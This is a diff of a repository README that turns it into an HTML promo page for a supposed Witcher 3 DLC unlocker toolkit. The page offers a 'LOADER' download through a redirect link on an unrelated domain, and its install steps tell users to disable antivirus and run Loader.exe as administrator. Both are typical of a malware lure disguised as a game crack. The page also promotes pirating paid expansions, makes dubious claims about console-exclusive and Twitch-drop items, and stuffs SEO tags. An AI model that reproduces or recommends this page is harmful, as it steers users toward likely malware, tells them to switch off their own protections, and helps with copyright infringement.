@@ -1,2 +1,26 @@
-# The-Witcher-3-DLC-Unlocker-CreamInstaller-CreamAPI-Toolkit
-The Witcher 3 DLC unlocker that automatically scans your installed games and generates the required configuration
+<div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
+<h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🔓 The Witcher 3 DLC Unlocker – CreamInstaller & CreamAPI Toolkit 🔓</h1>
+<p style="font-size:1.1em;text-align:center;"><strong>The Witcher 3 DLC unlocker that automatically scans your installed games and generates the required configuration.</strong> A complete solution that includes CreamInstaller, Koalageddon and other proven tools. Unlocks all The Witcher 3 DLCs – Hearts of Stone, Blood and Wine, and the entire 16‑piece free DLC program – on Steam, GOG, Epic and Ubisoft Connect.</p>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redirl" style="background:#44aaff;color:#000;padding:12px 25px;">⬇️ DOWNLOAD DLC UNLOCKER (LOADER)</a><p>✅ All‑in‑one installer ✅ CreamAPI + Koalageddon ✅ Automatic detection ✅ One‑click unlock</p></div>
+<img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/378649/48e242724931e89a71474b9f5ca080243e3ac772/header.jpg?t=1768304100" style="max-width:100%;border-radius:8px;margin:15px 0;">
+<div><h3>🎮 What This Toolkit Unlocks:</h3>
+<ul><li><strong>Hearts of Stone & Blood and Wine:</strong> The two massive expansions – new quests, regions, monsters, gear, the runewright, mutation system, and the grandmaster Witcher sets.</li>
+<li><strong>16 Free DLCs:</strong> All free content CD Projekt RED released, including extra quests ("Fool’s Gold", "Scavenger Hunt: Wolf School Gear"), alternate outfits for Yennefer, Triss and Ciri, new finisher animations, the New Game+ mode, Gwent cards, and the Temerian and Nilfgaardian armour sets.</li>
+<li><strong>All platform‑specific unlocks:</strong> Works with Steam, GOG, Epic Games Store and Ubisoft Connect editions. Also includes console‑style exclusive items normally restricted to certain versions.</li>
+<li><strong>Exclusive event items:</strong> Unlocks time‑limited rewards that were previously tied to Twitch Drops, Developer giveaways, or pre‑order bonuses – all made available retroactively.</li></ul>
+<h3>⚙️ What’s Inside the Toolkit:</h3>
+<ul><li><strong>CreamAPI</strong> – The classic Steam‑only DLC unlocker that works via Steam API interception and a pre‑configured cream_api.ini file.</li>
+<li><strong>Koalageddon R2</strong> – A modern GUI‑based tool that works across Steam, Epic, EA Desktop, Ubisoft Connect and GOG. One‑click toggles for all The Witcher 3 DLCs.</li>
+<li><strong>CreamInstaller</strong> – Automated GUI manager that scans your library, detects your platform, and deploys the right unlocker (CreamAPI, SmokeAPI, ScreamAPI or Koalageddon) with zero manual file editing.</li>
+<li><strong>SmokeAPI & ScreamAPI</strong> – Lightweight alternatives that automatically resolve conflicts when multiple unlockers try to load.</li>
+<li><strong>Configuration backup & restore</strong> – Safe rollback to original game files at any time.</li></ul>
+<h3>🚀 Which Unlocker Should You Choose?</h3>
+<ul><li><strong>CreamInstaller (recommended):</strong> Auto‑detects your platform, gives you a checklist of all owned games, and applies the correct unlocker in seconds. Best for beginners or anyone who wants a one‑click solution without touching config files.</li>
+<li><strong>Koalageddon R2:</strong> Ideal if you already use it for other games; the GUI lets you enable or disable The Witcher 3 DLCs independently at any time.</li>
+<li><strong>CreamAPI (manual):</strong> For advanced users who prefer full control over DLC IDs and want to understand how the unlock works under the hood.</li></ul>
+<p><strong>Important – In‑Game Activation of DLCs:</strong> After installation, some DLC content may not appear until you reach specific points in the game. The New Game+ mode only unlocks after completing the main story. The runewright appears after starting Hearts of Stone, and the mutation system only activates during the "Turn and Face the Strange" quest in Blood and Wine. This is normal – the DLCs are loaded, and the game triggers them according to its own quest logic.<br>Additionally, the in‑game Downloadable Content menu will show all 16 free DLCs as “installed”. You can verify they are active by checking this menu from the main title screen.</p>
+<h3>⚙️ System Requirements:</h3><p>Windows 10/11, The Witcher 3: Wild Hunt installed (Steam/GOG/Epic/Ubisoft), 200 MB free space for tools.</p>
+<h3>📥 Installation:</h3>
+<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px;text-align:center;"><div>1. Download archive</div><div>2. Disable antivirus (temp)</div><div>3. Run Loader.exe as Admin</div><div>4. Press INSERT to open menu</div></div>
+<div><strong>Tags:</strong> witcher 3 dlc unlocker free download 2026, creamapi witcher 3, the witcher 3 all dlc unlock, koalageddon witcher 3, creaminstaller witcher 3, witcher 3 hearts of stone free, witcher 3 blood and wine unlock, witcher 3 free dlc program, witcher 3 steam dlc unlocker, the witcher 3 epic games dlc unlock, witcher 3 gog dlc unlock, witcher 3 unlock all expansions, cd projekt red witcher 3 dlc unlocker, witcher 3 new game plus unlock, witcher 3 mutation unlock, witcher 3 runewright unlock, witcher 3 console exclusive items unlock, witcher 3 twitch drops unlocker, witcher 3 premium content unlock</div>
+</div>
